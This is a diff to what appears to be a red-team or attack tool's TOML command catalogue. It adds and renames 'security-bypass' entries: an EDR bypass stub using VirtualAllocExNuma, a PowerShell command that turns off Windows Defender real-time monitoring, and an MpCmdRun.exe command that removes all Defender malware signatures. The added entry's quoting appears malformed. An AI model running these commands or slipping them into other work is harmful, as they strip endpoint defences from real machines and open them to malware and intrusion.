@@ -42,8 +42,15 @@ short_desc = "EV-EDR bypass with NonEmulatedAPI - VirtualAllocExNuma (.NET Frame
 args = "[DllImport('kernel32.dll', SetLastError = true, ExactSpelling = true)]static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);"
 
 [command.DisableRealtimeMonitoring]
-use_name = "Disable RealTime Monitoring"
+use_name = "Windows Defender - Realtime Monitoring"
 local = true
 cmd_types = "security-bypass"
 short_desc = "Disable Windows Defender Realtime Monitoring Protection"
 args = "Set-MpPreference -DisableRealTimeMonitoring $true"
+
+[command.RemoveMalwareSignatures]
+use_name = "Windows Defender - Signatures"
+local = true
+cmd_types = "security-bypass"
+short_desc = "Windows Defender - Remove Malware Signatures"
+args = "C:\\Program Files\\Windows Defender\\MpCmdRun.exe" -RemoveDefinitions -All
